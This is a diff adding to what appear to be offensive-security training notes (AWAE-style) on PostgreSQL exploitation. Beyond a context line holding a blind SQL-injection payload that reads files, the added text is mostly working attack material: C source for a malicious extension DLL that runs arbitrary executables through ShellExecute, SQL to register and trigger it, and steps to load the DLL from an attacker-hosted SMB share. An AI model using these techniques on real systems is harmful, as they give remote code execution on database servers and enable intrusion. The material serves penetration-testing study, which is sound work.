@@ -83,3 +83,89 @@ DROP TABLE awae;
 ```
 create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+
 ```
+
+### PostgreSQL Extensions
+
+We can load an extension using the following syntax style:
+
+`CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;`
+
+**Loading a Custom Dynamic Library**
+
+> The compiled extension we want to load must define an appropriate Postgres structure (magic block) to ensure that a dynamic library file is not loaded into an incompatible server. If the target library doesn't have this magic block (as is the case with all standard system libraries), then the loading process will fail.
+
+```
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT;
+SELECT system('hostname');
+ERROR:  incompatible library "c:\Windows\System32\kernel32.dll": missing magic block
+HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro.
+
+********** Error **********
+```
+
+As seen above, the loading process failed which means that a custom dynamic library must be compiled.
+
+```
+#include "postgres.h"
+#include <string.h>
+#include "fmgr.h"
+#include "utils/geo_decls.h"
+#include <stdio.h>
+#include "utils/builtins.h"
+
+#ifdef PG_MODULE_MAGIC
+PG_MODULE_MAGIC;
+#endif
+
+/* Add a prototype marked PGDLLEXPORT */
+PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
+PG_FUNCTION_INFO_V1(awae);
+
+/* this function launches the executable passed in as the first parameter
+in a FOR loop bound by the second parameter that is also passed */
+Datum
+awae(PG_FUNCTION_ARGS)
+{
+	   /* convert text pointer to C string */
+    #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
+
+    /* retrieve the second argument that is passed to the function (an integer)
+    that will serve as our counter limit*/
+    int instances = PG_GETARG_INT32(1);
+
+    for (int c = 0; c < instances; c++) {
+        /*launch the process passed in the first parameter*/
+        ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
+    }
+	PG_RETURN_VOID();
+}
+```
+
+The template above can be used to build a basic extension. We can initiate the build process by going to `Build > Build Solution` in Visual Studio.
+
+The following queries will create and run a UDF called test, bound to the awae function exported by our custom DLL.
+
+```
+create or replace function test(text, integer) returns void as $$C:\awae.dll$$, $$awae$$ language C strict;
+SELECT test($$calc.exe$$, 3);
+```
+
+To remove the DLL whilst debugging, use the following, then edit your extension code, re-compile, and re-test the extension:
+
+```
+c:\> net stop "Applications Manager"
+c:\> del c:\awae.dll
+c:\> net start "Applications Manager"
+DROP FUNCTION test(text, integer);
+```
+
+**Load a remote DLL**
+
+The source DLL file we are using for the UDF could be also located on a network share.
+
+Start and SMB server: `kali@kali:~$ sudo impacket-smbserver awae /home/kali/awae/`
+
+```
+CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.119.120\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
+SELECT remote_test($$calc.exe$$, 3);
+```
